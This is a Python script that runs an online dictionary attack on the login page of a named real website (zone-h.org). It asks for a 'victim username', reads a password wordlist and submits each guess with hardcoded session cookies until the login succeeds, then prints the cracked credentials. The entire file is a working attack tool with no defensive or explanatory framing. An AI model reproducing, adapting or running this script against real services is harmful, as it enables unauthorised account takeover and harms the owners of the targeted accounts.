import requests

url = 'https://www.zone-h.org/login'
passwordList = []
cookies = {'PHPSESSID': 'md00mpud5v8riipqbth5l0qod1', 'ZH': '4e1adea3c0e1d171c7aa6ea44ac41dc4'}


def do_login(data):
    response = requests.post(url=url, data=data, cookies=cookies)
    # print(response.status_code)
    # print(response.headers)
    # print(response.content)
    if 'Welcome  to your account' in str(response.content):
        return True
    return False


def read_password_file(path):
    global passwordList
    with open(path) as f:
        passwordList = f.read().splitlines()


def get_new_password():
    global passwordList
    if len(passwordList) < 1:
        return None
    return passwordList.pop()


username = input('Enter victim username: ')
passwordFile = input('Enter Path of password file: ')
read_password_file(passwordFile)

while True:
    password = get_new_password()
    if password is None:
        print('Sorry, password not find in file.')
        exit(1)
    print('[INFO] Trying password : ' + password)

    data = {'login': username, 'password': password}

    if do_login(data):
        print('[INFO] Password Found.')
        print('     USER : ' + username)
        print('     PASSWORD : ' + password)
        exit(0)
